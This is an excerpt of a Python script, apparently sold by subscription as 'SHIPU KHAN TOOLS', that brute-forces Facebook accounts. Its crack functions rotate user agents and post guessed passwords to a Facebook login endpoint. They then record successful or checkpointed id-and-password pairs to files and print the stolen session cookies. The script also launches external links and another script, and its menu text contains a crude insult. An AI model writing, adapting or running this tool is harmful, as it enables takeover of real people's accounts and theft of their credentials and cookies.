...
def main():
    ...
    while True:
        ...
        print(" \033[92;1mPASSWORD CHEAKING ")
        time.sleep(2)
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to SHIPU KHAN TOOLS!")
...
os.system(f'xdg-open https://t.me/skmahmud77/')
#------------------[ SHIPU ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 OPX/1.5",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
...
ua = ["Mozilla/5.0 (Linux; Android 11; 2109119BC Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4464.28 Mobile Safari/537.36",]
ua = ["Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",]
ua = ["Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; es-LA; moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.10.1227 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
...
def Subscraption():
    ...
    if id in r1:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 500 Taka \033[0;95m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 800 Taka \033[0;95m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m SHIPU TooLs Daily Update)✅ \033[0;95m")
        print("\033[1;39m┏━[\033[1;32m●\033[1;39m] \033[1;32mNote : \033[0;41mByPass: User Fuck Your Mother):\033[0;95m")
        print("\033[1;39m┗━━━━━━━━━━━━\033[1;32mFREE USER NOT COME INBOX 🌺\033[0;95m")
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mONLY ACTIVE ID CLONING \033[0;95m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;33mUnActive id Not Allow \033[0;95m")
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32mCp id Login 60% \033[0;95m")
...
def menu():
    ...
    if Rakib in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801786100329')
        os.system("python nono.py")
    elif Rakib in ['3','03']:
        result()
    elif Rakib in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[SHIPU•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[SHIPU•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93m𝗔𝗞𝗔𝗦𝗛-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/𝗔𝗞𝗔𝗦𝗛-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;95mSHIPU-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[SHIPU\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " Akash,  Ok,  id"')
                open('/sdcard/SHIPU-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SHIPU-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mSHIPU-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/SHIPU-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0;95mSHIPU-Ok] {idf} \033[0;97m• \033[0;95m{pw} ')
                #cek_apk(session,coki)
